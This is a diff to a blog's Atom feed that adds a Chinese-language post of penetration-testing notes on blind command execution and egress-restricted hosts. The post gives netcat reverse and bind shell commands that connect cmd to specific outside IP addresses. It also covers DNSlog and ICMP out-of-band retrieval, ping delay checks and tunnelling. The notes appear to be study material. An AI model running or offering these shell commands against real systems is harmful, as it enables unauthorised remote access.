@@ -6,7 +6,7 @@
   <link href="http://example.com/atom.xml" rel="self"/>
   
   <link href="http://example.com/"/>
-  <updated>2024-12-18T15:45:48.472Z</updated>
+  <updated>2024-12-18T17:07:15.637Z</updated>
   <id>http://example.com/</id>
   
   <author>
@@ -15,6 +15,30 @@
   </author>
   
   <generator uri="https://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>数据不回显不出网</title>
+    <link href="http://example.com/posts/20241219.html"/>
+    <id>http://example.com/posts/20241219.html</id>
+    <published>2024-12-18T16:42:33.000Z</published>
+    <updated>2024-12-18T17:07:15.637Z</updated>
+    
+    <content type="html"><![CDATA[<h2 id="1-数据不回显"><a href="#1-数据不回显" class="headerlink" title="1. 数据不回显"></a>1. 数据不回显</h2><p>原因：代码层面函数调用问题，没有输出测试等<br>解决：反弹、带外、延迟、写文件<br>流程：判断是否为数据不回显且有漏洞、如何得到执行的数据</p><h3 id="1-1-反弹权限"><a href="#1-1-反弹权限" class="headerlink" title="1.1 反弹权限"></a>1.1 反弹权限</h3><p>判断目标系统，使用不同命令反弹</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs sh">https://forum.ywhack.com/shell.php<br>https://cloud.tencent.com/developer/article/1906240<br>https://www.revshells.com/<br><br>nc -e cmd 119.45.254.149 7777<br>nc -lvp 7777<br></code></pre></td></tr></table></figure><h3 id="1-2-数据带外"><a href="#1-2-数据带外" class="headerlink" title="1.2 数据带外"></a>1.2 数据带外</h3><p>DNSlog<br>TCP-Portlog<br>ICMP-Sizelog</p><h3 id="1-3-延迟判断"><a href="#1-3-延迟判断" class="headerlink" title="1.3 延迟判断"></a>1.3 延迟判断</h3><p>发请求包看回显时间</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs txt">ping -n 3 127.0.0.1<br>ping -c 3 127.0.0.1<br></code></pre></td></tr></table></figure><h3 id="1-4-写不存在文件访问"><a href="#1-4-写不存在文件访问" class="headerlink" title="1.4 写不存在文件访问"></a>1.4 写不存在文件访问</h3><p>写静态文件、在可访问文件写入内容确定</p><h2 id="2-数据不出网"><a href="#2-数据不出网" class="headerlink" title="2. 数据不出网"></a>2. 数据不出网</h2><p>原因：主机或防火墙等出站限制<br>解决：正反连接、出入站规则、隧道<br>流程：判断出入站限制、出入限制的端口和协议、分析后确定手法</p><h3 id="2-1-反向连接"><a href="#2-1-反向连接" class="headerlink" title="2.1 反向连接"></a>2.1 反向连接</h3><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs txt"># 开启入站策略，采用反向连接，主动给出去，对方监听<br><br># 绑定CMD到目标IP的6666端口<br>nc -e cmd 146.56.193.187 6666<br># 等待6666连接<br>nc -lvvp 6666<br></code></pre></td></tr></table></figure><h3 id="2-2-正向连接"><a href="#2-2-正向连接" class="headerlink" title="2.2 正向连接"></a>2.2 正向连接</h3><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs txt"># 开启出站规则，采用正向连接<br><br># 绑定CMD到本地6666端口<br>nc -e cmd -lvvp 6666<br># 主动连接目标6666<br>nc 43.134.218.194 6666<br></code></pre></td></tr></table></figure><h3 id="2-3-隧道技术"><a href="#2-3-隧道技术" class="headerlink" title="2.3 隧道技术"></a>2.3 隧道技术</h3><p>ICMP、DNS等隧道技术</p>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;h2 id=&quot;1-数据不回显&quot;&gt;&lt;a href=&quot;#1-数据不回显&quot; class=&quot;headerlink&quot; title=&quot;1. 数据不回显&quot;&gt;&lt;/a&gt;1. 数据不回显&lt;/h2&gt;&lt;p&gt;原因：代码层面函数调用问题，没有输出测试等&lt;br&gt;解决：反弹、带外、延迟、写文件&lt;br&gt;流程：判</summary>
+      
+    
+    
+    
+    <category term="Cyber Security" scheme="http://example.com/categories/Cyber-Security/"/>
+    
+    
+    <category term="Basics" scheme="http://example.com/tags/Basics/"/>
+    
+  </entry>
   
   <entry>
     <title>抓包技术</title>
